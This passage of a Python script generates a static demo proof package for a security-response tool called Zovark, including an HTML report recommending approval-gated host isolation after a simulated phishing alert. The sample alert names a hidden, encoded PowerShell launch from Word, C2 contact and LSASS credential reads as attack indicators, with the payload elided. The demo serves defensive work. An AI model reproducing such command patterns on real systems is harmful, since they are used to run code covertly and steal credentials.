  .banner h1 {{ font-size: 1.1rem; color: #fff; letter-spacing: 0.05em; }}
  .banner .notice {{ font-size: 0.75rem; color: #fc8181; background: #2d1515;
                     border: 1px solid #e53e3e; padding: 4px 12px; border-radius: 4px; }}
  .hero {{ background: linear-gradient(135deg, #1a1d27 0%, #0f1117 100%);
           padding: 48px 32px 32px; text-align: center; border-bottom: 1px solid #2d3748; }}
  .hero .question {{ font-size: 2rem; font-weight: 700; color: #fff; margin-bottom: 8px; }}
  .hero .sub {{ color: #a0aec0; font-size: 1rem; }}
  .container {{ max-width: 1100px; margin: 0 auto; padding: 32px; }}
  .card {{ background: #1a1d27; border: 1px solid #2d3748; border-radius: 8px;
           padding: 24px; margin-bottom: 24px; }}
  .card h2 {{ font-size: 1rem; font-weight: 600; color: #90cdf4; text-transform: uppercase;
              letter-spacing: 0.08em; margin-bottom: 16px; border-bottom: 1px solid #2d3748;
              padding-bottom: 8px; }}
  .action-card {{ border: 2px solid #e53e3e; }}
  .action-card h2 {{ color: #fc8181; }}
  .field {{ display: flex; gap: 16px; margin-bottom: 8px; align-items: flex-start; }}
  .field .label {{ color: #718096; font-size: 0.85rem; min-width: 180px; flex-shrink: 0; }}
  .field .value {{ color: #e2e8f0; font-size: 0.9rem; }}
  .badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px;
            font-size: 0.8rem; font-weight: 600; }}
  .badge-red {{ background: #2d1515; color: #fc8181; border: 1px solid #e53e3e; }}
  .badge-green {{ background: #1a2d1a; color: #68d391; border: 1px solid #38a169; }}
  .badge-orange {{ background: #2d1f0a; color: #f6ad55; border: 1px solid #dd6b20; }}
  .badge-blue {{ background: #0a1a2d; color: #90cdf4; border: 1px solid #3182ce; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 0.85rem; }}
  th {{ text-align: left; color: #718096; font-weight: 500; padding: 8px;
        border-bottom: 1px solid #2d3748; }}
  td {{ padding: 8px; border-bottom: 1px solid #1e2535; vertical-align: top; }}
  code {{ font-family: "SF Mono", "Fira Code", monospace; font-size: 0.8rem;
          background: #0f1117; padding: 2px 6px; border-radius: 3px; color: #90cdf4; }}
  .verdict-box {{ background: #1a0a0a; border: 2px solid #e53e3e; border-radius: 8px;
                  padding: 20px; text-align: center; }}
  .verdict-value {{ font-size: 2rem; font-weight: 800; color: #fc8181; letter-spacing: 0.1em; }}
  .verdict-rule {{ color: #718096; font-size: 0.85rem; margin-top: 8px; }}
  .replay-box {{ background: #0a1a0a; border: 2px solid #38a169; border-radius: 8px; padding: 20px; }}
  .replay-status {{ font-size: 1.5rem; font-weight: 700; color: #68d391; }}
  .check-row {{ display: flex; gap: 12px; align-items: center; margin: 6px 0; font-size: 0.9rem; }}
  .check-pass {{ color: #68d391; }}
  .check-none {{ color: #fc8181; }}
  .hash-chain {{ font-family: monospace; font-size: 0.75rem; color: #718096; }}
  .footer {{ text-align: center; padding: 32px; color: #4a5568; font-size: 0.8rem;
             border-top: 1px solid #2d3748; margin-top: 32px; }}
  ul {{ padding-left: 20px; }}
  li {{ margin-bottom: 4px; color: #a0aec0; font-size: 0.9rem; }}
</style>
</head>
<body>

<div class="banner">
  <h1>⚡ Zovark — Proof Package</h1>
  <span class="notice">Static Slice 001 proof-package walkthrough — not a live EDR integration.</span>
</div>

<div class="hero">
  <div class="question">Should we approve host isolation?</div>
  <div class="sub">HOST-12 · tenant-demo · 2026-05-02T09:14Z</div>
</div>

<div class="container">

  <!-- ACTION CARD -->
  <div class="card action-card">
    <h2>⚠ Recommended Action — EDR Action Card</h2>
    <div class="field"><span class="label">Action</span>
      <span class="value"><strong>ISOLATE_HOST</strong></span></div>
    <div class="field"><span class="label">Target</span>
      <span class="value">HOST-12 (HOST-12.corp.example)</span></div>
    <div class="field"><span class="label">Approval mode</span>
      <span class="value"><span class="badge badge-red">approval_required</span></span></div>
    <div class="field"><span class="label">Dispatch status</span>
      <span class="value"><span class="badge badge-orange">pending — not dispatched</span></span></div>
    <div class="field"><span class="label">Reversibility</span>
      <span class="value"><span class="badge badge-green">automatic</span>
        — <code>release_isolation</code> available · 4h window</span></div>
    <div class="field"><span class="label">Authorization</span>
      <span class="value"><code>vault://placeholder/bootstrap</code></span></div>
    <div class="field"><span class="label">Idempotency key</span>
      <span class="value" style="font-family:monospace;font-size:0.8rem">{handoff['idempotency_key'][:32]}…</span></div>
  </div>

  <!-- ORIGINAL ALERT -->
  <div class="card">
    <h2>📋 Original Alert Summary</h2>
    <div class="field"><span class="label">Alert ID</span><span class="value">alert-20260502-001</span></div>
    <div class="field"><span class="label">Host</span><span class="value">HOST-12.corp.example</span></div>
    <div class="field"><span class="label">Severity</span><span class="value"><span class="badge badge-orange">HIGH</span></span></div>
    <div class="field"><span class="label">Description</span><span class="value">Suspicious child process spawned by Office application</span></div>
    <div class="field"><span class="label">Source process</span><span class="value"><code>winword.exe</code></span></div>
    <div class="field"><span class="label">Child process</span><span class="value"><code>powershell.exe -WindowStyle Hidden -EncodedCommand …</code></span></div>
    <div class="field"><span class="label">User</span><span class="value">CORP\\jsmith</span></div>
    <div class="field"><span class="label">C2 contact</span><span class="value">203.0.113.50:443 (HTTPS) · 98 KB received</span></div>
    <div class="field"><span class="label">Credential access</span><span class="value">LSASS memory read (T1003.001)</span></div>
    <div class="field"><span class="label">Lateral movement</span><span class="value">SMB to HOST-13 — blocked by firewall (T1021.002)</span></div>
  </div>

  <!-- EVIDENCE -->
  <div class="card">
    <h2>🔒 Evidence Ledger (5 entries · SHA-256 verified)</h2>
    <table>
      <tr><th>Type</th><th>Evidence ID</th><th>Hash (SHA-256)</th><th>Ingested</th></tr>
      {ev_rows}
    </table>
  </div>

  <!-- FINDINGS -->
  <div class="card">
    <h2>🔍 Findings (rule-driven · model_contribution: false)</h2>
    <table>
      <tr><th>Finding</th><th>Severity</th><th>MITRE</th><th>Evidence refs</th></tr>
      {finding_rows}
    </table>
  </div>

  <!-- VERDICT -->
  <div class="card">
    <h2>⚖ Deterministic Verdict</h2>
    <div class="verdict-box">
      <div class="verdict-value">CONFIRMED_MALICIOUS</div>
      <div class="verdict-rule">Derivation rule: any finding with severity critical or high → confirmed_malicious</div>
      <div class="verdict-rule" style="margin-top:8px">model_contribution: false · signing_tag: <code>{verdict['signing_tag'][:32]}…</code></div>
    </div>
  </div>

  <!-- BLAST RADIUS -->
  <div class="card">
    <h2>💥 Blast Radius</h2>
    <div class="field"><span class="label">Directly affected</span><span class="value">HOST-12 only</span></div>
    <div class="field"><span class="label">Services at risk</span>
      <span class="value"><ul>{blast_items}</ul></span></div>
    <div class="field"><span class="label">Lateral movement</span>
      <span class="value">HOST-13 targeted — already blocked by firewall</span></div>
    <div class="field"><span class="label">Business impact</span>
      <span class="value">{blast['estimated_business_impact']}</span></div>
  </div>

  <!-- REVERSAL PLAN -->
  <div class="card">
    <h2>↩ Reversal / Recovery Plan</h2>
    <div class="field"><span class="label">Reversibility class</span>
      <span class="value"><span class="badge badge-green">automatic</span></span></div>
    <div class="field"><span class="label">Vendor reversal action</span>
      <span class="value"><code>release_isolation</code></span></div>
    <div class="field"><span class="label">Reversal window</span><span class="value">4 hours from dispatch</span></div>
    <div class="field"><span class="label">Manual steps</span><span class="value">None required</span></div>
    <div class="field"><span class="label">Recovery notes</span>
      <span class="value">{rev['recovery_notes']}</span></div>
  </div>

  <!-- REPLAY PROOF -->
  <div class="card">
    <h2>▶ Replay Verification</h2>
    <div class="replay-box">
      <div class="replay-status">✓ succeeded</div>
      <div style="margin-top:16px">
        <div class="check-row"><span class="check-pass">✅</span> Evidence hashes verified (5/5)</div>
        <div class="check-row"><span class="check-pass">✅</span> Verdict recomputed: CONFIRMED_MALICIOUS</div>
        <div class="check-row"><span class="check-pass">✅</span> Verdict matched stored verdict</div>
        <div class="check-row"><span class="check-none">❌</span> No live LLM call during replay</div>
        <div class="check-row"><span class="check-none">❌</span> No live EDR call during replay</div>
      </div>
      <div style="margin-top:16px;font-size:0.85rem;color:#718096">
        Replay ID: <code>replay-001</code> · Mode: <code>recorded_output</code>
      </div>
    </div>
  </div>

  <!-- AUDIT CHAIN -->
  <div class="card">
    <h2>🔗 Audit Chain</h2>
    <div class="field"><span class="label">Entry 1</span>
      <span class="value hash-chain">tape_recording_closed · audit-entry-1<br>
        this_entry_hash: {ace['prev_entry_hash'][:48]}…</span></div>
    <div class="field"><span class="label">Entry 2</span>
      <span class="value hash-chain">tape_replayed · audit-entry-2<br>
        prev_entry_hash: {ace['prev_entry_hash'][:48]}…<br>
        this_entry_hash: {ace['this_entry_hash'][:48]}…</span></div>
    <div class="field"><span class="label">Chain integrity</span>
      <span class="value"><span class="badge badge-green">hash-linked</span>
        · unsigned tail · root signing deferred to M1+</span></div>
  </div>

</div>

<div class="footer">
  Zovark is the AI-native proof layer for high-stakes security response.<br>
  Static Slice 001 proof-package walkthrough — not a live EDR integration.<br>
  Full pipeline implementation in progress.
</div>

</body>
</html>
"""


# ---------------------------------------------------------------------------
# Write helpers
# ---------------------------------------------------------------------------

def write_json(path: Path, obj: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(obj, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    print(f"  wrote {path.relative_to(REPO_ROOT)}")


def write_text(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    print(f"  wrote {path.relative_to(REPO_ROOT)}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    print("Generating Zovark YC demo proof package...")

    # 1. Evidence
    ledger = build_evidence_ledger()

    # 2. Findings
    findings = build_findings(ledger)

    # 3. Verdict
    verdict = build_verdict(findings, ledger)

    # 4. Timeline
    timeline = build_timeline(ledger)

    # 5. Handoff
    handoff = build_handoff(ledger)

    # 6. Audit close entry (needs tape snapshot for fields_hash)
    tape_snapshot_for_audit = {
        "findings": findings,
        "raw_evidence": ledger,
        "schema_version": "tape/1.0",
        "source_alert_ref": "alert-20260502-001",
        "tape_id": TAPE_ID,
        "tenant_id": TENANT_ID,
        "verdict_value": "confirmed_malicious",
    }
    close_entry = build_audit_close_entry(tape_snapshot_for_audit)

    # 7. Replay audit entry
    replay_entry = build_audit_replay_entry(close_entry)

    # 8. Replay report
    replay_report = build_replay_report(replay_entry)

    # 9. Full tape
    tape = build_tape(ledger, timeline, findings, verdict, handoff, close_entry["entry_id"])

    # 10. Customer report
    customer_report = build_customer_report(ledger, findings, verdict, handoff, replay_report)

    # --- Write all files ---

    # Sample input
    write_json(SAMPLES_DIR / "phishing-powershell.json", SAMPLE_JSON_CONTENT)

    # Out artifacts
    write_json(OUT_DIR / "evidence-ledger.json", ledger)
    write_json(OUT_DIR / "findings.json", findings)
    write_json(OUT_DIR / "verdict.json", verdict)
    write_json(OUT_DIR / "timeline.json", timeline)
    write_json(OUT_DIR / "edr-handoff.json", handoff)
    write_json(OUT_DIR / "audit-chain-entry.json", close_entry)
    write_json(OUT_DIR / "replay-report.json", replay_report)
    write_json(OUT_DIR / "investigation-tape.json", tape)
    write_text(OUT_DIR / "customer-report.md", customer_report)

    # Demo root
    write_text(DEMO_ROOT / "README.md", README_CONTENT)
    write_text(DEMO_ROOT / "demo-script.md", DEMO_SCRIPT_CONTENT)
    write_text(DEMO_ROOT / "demo.html", build_demo_html(ledger, findings, verdict, handoff, replay_report))

    print("\nDone. Run python scripts/validate_yc_demo.py to verify.")


if __name__ == "__main__":
    main()
